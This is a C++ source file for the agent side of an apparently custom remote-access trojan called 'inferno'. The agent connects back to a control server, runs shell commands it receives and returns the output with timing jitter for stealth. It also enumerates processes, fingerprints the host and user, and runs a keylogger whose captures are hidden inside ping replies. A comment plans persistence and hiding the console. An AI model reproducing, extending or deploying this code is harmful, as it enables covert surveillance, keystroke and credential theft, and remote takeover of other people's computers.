#include "../include/Agent.hpp"
#include <iostream>
#include <chrono>
#include <thread>
#include <random>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <fstream>

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <lmcons.h>
#else
#include <unistd.h>
#include <sys/utsname.h>
#include <pwd.h>
#endif

#ifdef __APPLE__
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#endif

namespace inferno {

Agent::Agent() : m_server_ip("127.0.0.1"), m_server_port(8080), m_state(AgentState::INIT), m_running(false) {}

Agent::Agent(const std::string& server_ip, uint16_t server_port)
    : m_server_ip(server_ip), m_server_port(server_port), m_state(AgentState::INIT), m_running(false) {}

Agent::~Agent() {
    stop();
}

void Agent::run() {
    m_running = true;
    while (m_running) {
        switch (m_state) {
            case AgentState::INIT:
                handleInit();
                break;
            case AgentState::CONNECTING:
                handleConnecting();
                break;
            case AgentState::CONNECTED:
                handleConnected();
                break;
            case AgentState::LISTENING:
                handleListening();
                break;
            case AgentState::DISPATCHING:
                // Handled internally in handleListening
                break;
            case AgentState::ERROR_STATE:
                std::cerr << "[Agent] Terminal Error State reached. Restarting INIT.\n";
                m_state = AgentState::INIT;
                break;
        }
    }
}

void Agent::stop() {
    m_running = false;
    // Socket will be closed by destructor or on reconnection
}

void Agent::handleInit() {
    std::cout << "[Agent] Initializing...\n";
    // Future: Setup persistence, hide console, etc.
    m_state = AgentState::CONNECTING;
}

void Agent::handleConnecting() {
    std::cout << "[Agent] Attempting to connect to " << m_server_ip << ":" << m_server_port << "..." << std::endl;
    if (m_socket.connectTo(m_server_ip, m_server_port)) {
        std::cout << "[Agent] Connection established." << std::endl;
        m_state = AgentState::CONNECTED;
    } else {
        std::cerr << "[Agent] Connection failed. Retrying in 5 seconds..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

void Agent::handleConnected() {
    // Transition to LISTENING. The Server will request info via SYS_REQ_INFO.
    m_state = AgentState::LISTENING;
}

void Agent::handleListening() {
    std::vector<uint8_t> buffer;
    ssize_t bytes = m_socket.receiveData(buffer, 4096);

    if (bytes <= 0) {
        std::cerr << "[Agent] Connection lost.\n";
        m_state = AgentState::CONNECTING;
        return;
    }

    // Accumulate in member buffer (handles TCP fragmentation)
    m_receive_buffer.insert(m_receive_buffer.end(), buffer.begin(), buffer.end());

    // Sliding buffer loop: process ALL complete packets in the buffer
    while (true) {
        // Guard: need at least a full header to inspect
        if (m_receive_buffer.size() < sizeof(PacketHeader)) break;

        // Resync: peek at magic before calling deserialize().
        // deserialize() returns nullopt for BOTH "incomplete data" and "invalid magic/checksum".
        // Without this check, a single corrupted prefix byte causes an infinite stall.
        const uint32_t magic =
            (static_cast<uint32_t>(m_receive_buffer[0]) << 24) |
            (static_cast<uint32_t>(m_receive_buffer[1]) << 16) |
            (static_cast<uint32_t>(m_receive_buffer[2]) << 8)  |
             static_cast<uint32_t>(m_receive_buffer[3]);

        if (magic != 0xDEADBEEF) {
            std::cerr << "[Agent] Buffer desync detected — discarding 1 byte to resync.\n";
            m_receive_buffer.erase(m_receive_buffer.begin());
            continue;
        }

        auto packet_opt = ::inferno::Packet::deserialize(m_receive_buffer);
        if (!packet_opt.has_value()) {
            break; // Incomplete packet — wait for more data
        }
        const size_t packet_size = sizeof(PacketHeader) + packet_opt->getWirePayloadSize();
        handleDispatching(std::move(*packet_opt));
        // Slide: remove the consumed packet bytes from the front of the buffer
        m_receive_buffer.erase(m_receive_buffer.begin(),
                               m_receive_buffer.begin() + packet_size);
    }
}

void Agent::handleDispatching(Packet&& packet) {
    uint16_t opcode = packet.getOpcode();
    std::cout << "[Agent] Dispatching Opcode: " << opcode << std::endl;

    if (opcode == static_cast<uint16_t>(Opcode::SYS_REQ_INFO)) {
        std::string info = getSystemInfo();
        Packet res(static_cast<uint16_t>(Opcode::SYS_RES_INFO), info);
        std::vector<uint8_t> data = res.serialize();
        m_socket.sendData(data);
    } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
        handleProcessDiscovery();
    } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
        handleShellExecution(std::move(packet));
    } else if (opcode == static_cast<uint16_t>(Opcode::PING)) {
        // Piggyback keylog data on PONG: prefer jittered data from shared buffer,
        // fall back to immediate dump for any remaining keystrokes
        std::string pong_payload;
        {
            std::lock_guard<std::mutex> lock(m_keylog_pending_mutex);
            if (!m_keylog_pending_data.empty()) {
                pong_payload = std::move(m_keylog_pending_data);
            }
        }
        if (pong_payload.empty() && m_keylogger.isRunning()) {
            pong_payload = m_keylogger.dump();
        }
        Packet pong(static_cast<uint16_t>(Opcode::PONG), pong_payload);
        std::vector<uint8_t> data = pong.serialize();
        m_socket.sendData(data);
    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_START)) {
        handleKeylogStart();
    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_STOP)) {
        handleKeylogStop();
    } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DUMP)) {
        handleKeylogDump();
    }
}

void Agent::handleKeylogStart() {
    std::cout << "[Agent] Starting KeyLogger...\n";
    m_keylogger.start();

    m_keylog_jitter_running = true;
    m_keylog_dump_requested = false;
    m_keylog_jitter_thread = std::thread([this]() {
        std::mt19937 rng(std::random_device{}());
        std::uniform_int_distribution<int> jitter_dist(500, 3000);

        while (m_keylog_jitter_running) {
            std::unique_lock<std::mutex> lock(m_keylog_jitter_mutex);
            if (!m_keylog_jitter_cv.wait_for(lock, std::chrono::milliseconds(200),
                [this]() { return m_keylog_dump_requested.load() || !m_keylog_jitter_running; })) {
                continue;
            }
            if (!m_keylog_jitter_running) break;

            m_keylog_dump_requested = false;
            lock.unlock();

            std::this_thread::sleep_for(std::chrono::milliseconds(jitter_dist(rng)));

            std::string keystrokes = m_keylogger.dump();
            if (keystrokes.empty()) continue;

            // Store in shared buffer for PONG piggybacking — no direct send
            {
                std::lock_guard<std::mutex> lock(m_keylog_pending_mutex);
                m_keylog_pending_data = std::move(keystrokes);
            }
        }
    });
}

void Agent::handleKeylogStop() {
    std::cout << "[Agent] Stopping KeyLogger...\n";
    m_keylogger.stop();

    m_keylog_jitter_running = false;
    m_keylog_jitter_cv.notify_one();
    if (m_keylog_jitter_thread.joinable()) {
        m_keylog_jitter_thread.join();
    }
}

void Agent::handleKeylogDump() {
    std::cout << "[Agent] Keylogger dump requested (jitter scheduled)...\n";
    m_keylog_dump_requested = true;
    m_keylog_jitter_cv.notify_one();
}

void Agent::handleShellExecution(Packet&& packet) {
    // 1. Deserialize the command from the payload
    const auto& raw = packet.getPayload();
    if (raw.size() < 2) {
        std::cerr << "[Agent] CMD_EXEC: payload too short." << std::endl;
        return;
    }
    const uint16_t cmd_len = (static_cast<uint16_t>(raw[0]) << 8) | raw[1];
    if (raw.size() < static_cast<size_t>(2 + cmd_len)) {
        std::cerr << "[Agent] CMD_EXEC: payload truncated." << std::endl;
        return;
    }
    const std::string command(raw.begin() + 2, raw.begin() + 2 + cmd_len);
    std::cout << "[Agent] Executing: " << command << std::endl;

    // 2. Execute via ShellExecutor
    const ShellExecutor::Result result = m_shell.execute(command);

    // 3. Transmit output in 4096-byte chunks (stealth page-size chunking)
    const std::string& output = result.output;
    const size_t chunk_size   = ShellExecutor::CHUNK_SIZE;
    const size_t total        = output.size();
    size_t offset             = 0;

    auto send_chunk = [&](uint8_t status, const std::string& data) {
        std::vector<uint8_t> payload;
        payload.push_back(status);
        // Append data length (2 bytes, big-endian)
        const uint16_t len = static_cast<uint16_t>(data.size());
        payload.push_back(static_cast<uint8_t>((len >> 8) & 0xFF));
        payload.push_back(static_cast<uint8_t>(len & 0xFF));
        payload.insert(payload.end(), data.begin(), data.end());

        Packet res(static_cast<uint16_t>(Opcode::CMD_RES),
                   std::string(payload.begin(), payload.end()));
        m_socket.sendData(res.serialize());
    };

    if (total == 0) {
        // Send empty end-of-output immediately
        send_chunk(1, "");
        return;
    }

    thread_local std::mt19937 jitter_rng(std::random_device{}());
    std::uniform_int_distribution<int> jitter_dist(50, 250);

    do {
        const size_t end   = std::min(offset + chunk_size, total);
        const bool is_last = (end == total);
        const uint8_t status = is_last ? 1 : 0;
        send_chunk(status, output.substr(offset, end - offset));
        offset = end;
        if (!is_last) {
            std::this_thread::sleep_for(
                std::chrono::milliseconds(jitter_dist(jitter_rng)));
        }
    } while (offset < total);
}

void Agent::handleProcessDiscovery() {
    const auto& list = m_profiler.getSnapshot();
    
    // Chunking parameters
    const size_t entries_per_page = 50;
    size_t total_pages = (list.size() + entries_per_page - 1) / entries_per_page;

    // Helper: Platfrom-independent Big-Endian serialization
    auto append_u16 = [](std::vector<uint8_t>& out, uint16_t value) {
        out.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
        out.push_back(static_cast<uint8_t>(value & 0xFF));
    };
    auto append_u32 = [](std::vector<uint8_t>& out, uint32_t value) {
        out.push_back(static_cast<uint8_t>((value >> 24) & 0xFF));
        out.push_back(static_cast<uint8_t>((value >> 16) & 0xFF));
        out.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
        out.push_back(static_cast<uint8_t>(value & 0xFF));
    };

    for (size_t p = 0; p < total_pages; p++) {
        std::vector<uint8_t> payload;
        
        // 1. Header of the page
        uint8_t is_last = (p == total_pages - 1) ? 1 : 0;
        size_t start = p * entries_per_page;
        size_t end = std::min(start + entries_per_page, list.size());
        uint16_t entries_in_page = static_cast<uint16_t>(end - start);

        // Serialization
        append_u16(payload, static_cast<uint16_t>(p)); // Page Index
        payload.push_back(is_last);
        append_u16(payload, entries_in_page);

        // 2. Add entries
        for (size_t i = start; i < end; i++) {
            uint16_t name_len = static_cast<uint16_t>(list[i].name.length());

            append_u32(payload, list[i].pid);
            append_u16(payload, name_len);

            // Name
            payload.insert(payload.end(), list[i].name.begin(), list[i].name.end());
        }

        Packet res(static_cast<uint16_t>(Opcode::PROC_LIST_RES), 
                  std::string(payload.begin(), payload.end()));
        
        m_socket.sendData(res.serialize());
    }
}

std::string Agent::getHardwareUUID() {
#ifdef _WIN32
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256] = {0};
        DWORD value_length = sizeof(value);
        if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, reinterpret_cast<LPBYTE>(value), &value_length) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return "WIN-" + std::string(value);
        }
        RegCloseKey(hKey);
    }
    return "Unknown-Windows-UUID";
#elif defined(__APPLE__)
    io_registry_entry_t matching = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
    if (!matching) return "Unknown-Mac";
    
    CFStringRef serial = (CFStringRef)IORegistryEntryCreateCFProperty(matching, CFSTR(kIOPlatformSerialNumberKey), kCFAllocatorDefault, 0);
    IOObjectRelease(matching);
    
    if (!serial) return "Unknown-Mac-Serial";
    
    char buffer[256];
    if (CFStringGetCString(serial, buffer, sizeof(buffer), kCFStringEncodingUTF8)) {
        CFRelease(serial);
        // Simple hash-like representation (In production, use SHA-256)
        return "MAC-" + std::string(buffer);
    }
    CFRelease(serial);
    return "Unknown-Mac-ID";
#elif defined(__linux__)
    std::ifstream mid("/etc/machine-id");
    if (!mid.is_open()) mid.open("/var/lib/dbus/machine-id");
    
    if (mid.is_open()) {
        std::string id;
        mid >> id;
        return "LINUX-" + id;
    }
    return "Unknown-Linux";
#else
    return "Unknown-OS";
#endif
}

std::string Agent::getSystemInfo() {
    std::stringstream ss;
    ss << "ID: " << getHardwareUUID() << " | ";
    ss << "Host: " << getHostname() << " | ";
    ss << "User: " << getUsername() << " | ";
    ss << "OS: " << getOSVersion();
    return ss.str();
}

std::string Agent::getHostname() {
#ifdef _WIN32
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "Unknown-Windows-Host";
#else
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return std::string(hostname);
    }
    return "Unknown";
#endif
}

std::string Agent::getUsername() {
#ifdef _WIN32
    char buffer[UNLEN + 1];
    DWORD size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) {
        return std::string(buffer);
    }
    return "Unknown-Windows-User";
#else
    char username[256];
    if (getlogin_r(username, sizeof(username)) == 0) {
        return std::string(username);
    }
    // Fallback
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        return std::string(pw->pw_name);
    }
    return "Unknown";
#endif
}

std::string Agent::getOSVersion() {
#ifdef _WIN32
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char prodName[256] = {0};
        char displayVersion[256] = {0};
        DWORD prodNameLen = sizeof(prodName);
        DWORD displayVersionLen = sizeof(displayVersion);
        
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, reinterpret_cast<LPBYTE>(prodName), &prodNameLen);
        RegQueryValueExA(hKey, "DisplayVersion", NULL, NULL, reinterpret_cast<LPBYTE>(displayVersion), &displayVersionLen);
        RegCloseKey(hKey);
        
        std::stringstream ss;
        ss << "Windows " << (prodName[0] ? prodName : "OS");
        if (displayVersion[0]) {
            ss << " (" << displayVersion << ")";
        }
        return ss.str();
    }
    return "Windows OS";
#else
    struct utsname buffer;
    if (uname(&buffer) == 0) {
        std::stringstream ss;
        ss << buffer.sysname << " " << buffer.release << " (" << buffer.machine << ")";
        return ss.str();
    }
    return "Linux/Generic";
#endif
}

} // namespace inferno
